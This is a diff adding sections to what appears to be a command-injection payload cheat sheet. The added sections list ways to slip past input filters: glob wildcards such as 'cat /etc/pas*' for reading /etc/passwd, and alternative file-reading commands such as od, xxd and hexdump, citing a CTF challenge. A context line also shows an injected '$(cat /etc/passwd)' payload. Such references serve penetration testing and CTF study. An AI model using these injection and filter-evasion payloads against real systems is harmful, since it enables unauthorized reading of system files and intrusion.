@@ -63,6 +63,20 @@ original_cmd_by_server $(cat /etc/passwd)
 
 ## Filter Bypasses
 
+### Bypass characters filter with glob
+The following command can be used to read `/etc/passwd` file (Linux)
+```bash
+> cat /etc/pas* # wildcard with *
+> cat /etc/pas??? # wildcard with ? (for single character)
+> cat /etc/passw[a-z] # bracket glob syntax
+```
+Ref: https://linuxhint.com/bash_globbing_tutorial
+
+### Bypass command filter with uncommon commands
+- Commands to read file: cat, od, xd, hd, xxd, hexdump
+
+Ref: https://github.com/ryan-cd/ctf/tree/master/2021/0x41414141/shjail
+
 ### Bypass without space
 
 Works on Linux only.
